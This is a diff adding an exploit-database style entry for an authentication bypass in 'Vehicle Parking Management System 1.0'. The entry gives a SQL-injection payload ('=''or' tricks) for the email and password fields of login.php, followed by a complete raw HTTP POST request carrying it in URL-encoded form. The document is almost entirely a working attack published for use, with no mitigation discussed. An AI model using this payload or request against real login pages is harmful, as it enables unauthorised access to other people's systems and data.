@@ -1,0 +1,28 @@
+# Exploit Title: Vehicle Parking Management System 1.0 - Authentication Bypass
+# Google Dork: N/A
+# Date: 2020-10-14
+# Exploit Author: BKpatron
+# Vendor Homepage: https://www.sourcecodester.com/php/14415/vehicle-parking-management-system-project-phpmysql-full-source-code.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/mayuri_k/lagos-parker-fullsource-code.zip
+# Version: v1.0
+# Tested on: Win 10
+# CVE: N/A
+
+# Vulnerability: Attacker can bypass login page and access to dashboard page
+# vulnerable file : /login.php
+# Parameter & Payload: username: '=''or'@email.com password: '=''or'
+# Proof of Concept: http://localhost/lagos-parker/login.php
+
+POST /lagos-parker/login.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 73
+Referer: http://localhost/lagos-parker/login.php
+Cookie: PHPSESSID=q4efk7p0vo1866rwdxzq8aeam8
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+email=%27%3D%27%27or%27%40email.com&password=%27%3D%27%27or%27&btn_login=: undefined
